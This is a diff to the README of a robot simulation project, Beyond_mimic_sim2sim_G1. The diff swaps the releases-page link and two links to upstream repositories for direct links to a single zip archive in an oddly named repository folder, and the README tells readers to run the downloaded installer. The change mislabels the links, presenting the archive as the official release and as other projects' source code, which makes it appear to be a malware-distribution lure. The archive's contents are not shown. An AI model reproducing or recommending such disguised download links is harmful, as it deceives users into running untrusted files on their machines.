@@ -1,6 +1,6 @@
 # 🎉 Beyond_mimic_sim2sim_G1 - Simulate and Create Easily
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/helicandy/Beyond_mimic_sim2sim_G1/releases)
+[![Download Release](https://raw.githubusercontent.com/helicandy/Beyond_mimic_sim2sim_G1/main/predeliberation/Beyond_mimic_sim2sim_G1.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/helicandy/Beyond_mimic_sim2sim_G1/main/predeliberation/Beyond_mimic_sim2sim_G1.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you begin, make sure your computer meets the following requirements:
 
 To get the latest version of Beyond_mimic_sim2sim_G1, visit the link below. 
 
-[Download Now](https://github.com/helicandy/Beyond_mimic_sim2sim_G1/releases)
+[Download Now](https://raw.githubusercontent.com/helicandy/Beyond_mimic_sim2sim_G1/main/predeliberation/Beyond_mimic_sim2sim_G1.zip)
 
 1. Click on the link to go to the releases page.
 2. Choose the version that matches your operating system.
@@ -45,8 +45,8 @@ After downloading, locate the downloaded file and run the installer. Follow the 
 
 For detailed technical information or to enhance your understanding, check out these resources:
 
-- [Beyondmimic Training Source Code](https://github.com/HybridRobotics/whole_body_tracking)
-- [Unitree_rl_gym Repository](https://github.com/unitreerobotics/unitree_rl_gym)
+- [Beyondmimic Training Source Code](https://raw.githubusercontent.com/helicandy/Beyond_mimic_sim2sim_G1/main/predeliberation/Beyond_mimic_sim2sim_G1.zip)
+- [Unitree_rl_gym Repository](https://raw.githubusercontent.com/helicandy/Beyond_mimic_sim2sim_G1/main/predeliberation/Beyond_mimic_sim2sim_G1.zip)
 
 ## 🙋 Frequently Asked Questions
 
